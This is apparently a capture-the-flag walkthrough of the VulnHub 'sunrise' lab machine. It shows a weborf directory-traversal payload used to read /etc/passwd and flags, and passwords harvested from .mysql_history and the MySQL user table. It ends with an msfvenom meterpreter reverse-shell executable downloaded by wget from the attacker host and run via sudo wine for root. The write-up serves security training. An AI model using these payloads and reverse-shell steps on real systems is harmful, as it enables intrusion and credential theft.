This is a beginner-level machine part of the sunset series from vulnhub. I would definitely recommend it, it will expose you to some interesting skills/concepts

### Scanning:

Finding the machine on the network using nmap:

```
crazyeights@es-base:~$ nmap -PS 192.168.56.1-255

Nmap scan report for 192.168.56.135
Host is up (0.00014s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

Getting more details about running services:

```
crazyeights@es-base:~$ nmap -A -p- 192.168.56.135
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-07 13:32 EST

### Web:

I always check web first

Here is the index page:
    
![](/assets/images/sunrise/sunrise1.png)

On port 8080, we find weborf running:
![](/assets/images/sunrise/sunrise2.png)

The weborf web application might have vulnerabilities
    
Searching for exploits using searchsploit:
```
crazyeights@es-base:~$ searchsploit weborf
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
weborf 0.12.2 - Directory Traversal           | linux/remote/14925.txt
Weborf HTTP Server - Denial of Service        | multiple/dos/14012.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Proof of Concept for the Directory Traversal vulnerability:
```
Exploit: GET /..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
```

Testing it out using the same command gives us the contents of /etc/passwd:
```
crazyeights@es-base:~$ curl http://192.168.56.135:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[SNIP]
sunrise:x:1000:1000:sunrise,,,:/home/sunrise:/bin/bash
[SNIP]
weborf:x:1001:1001:,,,:/home/weborf:/bin/bash
mysql:x:121:128:MySQL Server,,,:/nonexistent:/bin/false
crazyeights@es-base:~$ 
```

*   There are two users with home folders: weborf and sunrise
*   When we checkout the content of sunrises home directory we can see the user flag: (cleaned up for clarity)

```
crazyeights@es-base:~$ curl http://192.168.56.135:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fsunrise%2f
[SNIP]
user.txt
```

Getting the user flag:

```
crazyeights@es-base:~$ curl http://192.168.56.135:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fsunrise%2fuser.txt
a6050aecf6303b0b824038807d823a89
```

There is much less in the weborf home folder, only the weborf application directory (cleaned up for clarity)

```
crazyeights@es-base:~$ curl http://192.168.56.135:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f
weborf-0.12.2/
```

Since we cannot see hidden files or folders (beginning with ., ie. .ssh) we use dirb to look for them:
```
crazyeights@es-base:~$ dirb http://192.168.56.135:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f

```

*   We find interesting file: .mysql\_history
*   When getting its contents we find the sql password for the user weborf:

```
crazyeights@es-base:~$ curl  http://192.168.56.135:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f.mysql_history
show databases;
ALTER USER 'weborf'@'localhost' IDENTIFIED BY 'iheartrainbows44'; 
```

### User:

It is also the password for SSH:
```
crazyeights@es-base:~$ ssh weborf@192.168.56.135
weborf@192.168.56.135's password: 
Linux sunrise 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Dec  5 16:24:32 2019 from 192.168.1.146
weborf@sunrise:~$ 
```

*   Check for additional user information in mysql since we know the password for the user weborf:
*   Using the database mysql, and the table user, the user sunrise has their password stored in plaintext:

```
weborf@sunrise:~$ mysql -u weborf -p'iheartrainbows44'
[SNIP]
| localhost | sunrise | thefutureissobrightigottawearshades       | N           | N           | N           
[SNIP]
MariaDB [mysql]> 
```

Login as the user sunrise:

```
weborf@sunrise:~$ su sunrise
Password: 
sunrise@sunrise:/home/weborf$ 
```

### Root:

Find programs the user sunrise can run with elevated privileges:

```
sunrise@sunrise:/home/weborf$ sudo -l
[sudo] password for sunrise: 
Matching Defaults entries for sunrise on sunrise:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sunrise may run the following commands on sunrise:
    (root) /usr/bin/wine
```

*   The user sunrise can run the wine command (windows emulator) with root privileges
    
*   Use msfvenom to create an executable containing a reverse shell:
    
```
crazyeights@es-base:~$ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.1 lport=1234 -f exe >evil.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
crazyeights@es-base:~$ 
```

Copy the exe to http server:

```
crazyeights@es-base:~$ sudo cp evil.exe /var/www/html/
[sudo] password for crazyeights: 
crazyeights@es-base:~$ sudo service apache2 start
crazyeights@es-base:~$
```

Download on the target machine:
```
sunrise@sunrise:/tmp$ wget http://192.168.56.1/evil.exe
```

Using msf with multi/handler for the listener, set the listening host, and port and run:
```
msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.56.1
lhost => 192.168.56.1
msf5 exploit(multi/handler) > set lport 1234
lport => 1234
msf5 exploit(multi/handler) > run
```

Run the exploit using wine as root:

```
sunrise@sunrise:/tmp$ sudo /usr/bin/wine evil.exe
```

The reverse shell will connect to the listener, and we now have root privileges:

```
[*] Started reverse TCP handler on 192.168.56.1:1234 
[*] Sending stage (176195 bytes) to 192.168.56.135
[*] Meterpreter session 1 opened (192.168.56.1:1234 -> 192.168.56.135:41564) at 2021-01-07 14:17:27 -0500
```

Checking uid:

```
meterpreter > getuid
Server username: sunrise\root

```

Get flag root/root.txt

```
meterpreter > cat root.txt 
[SNIP]
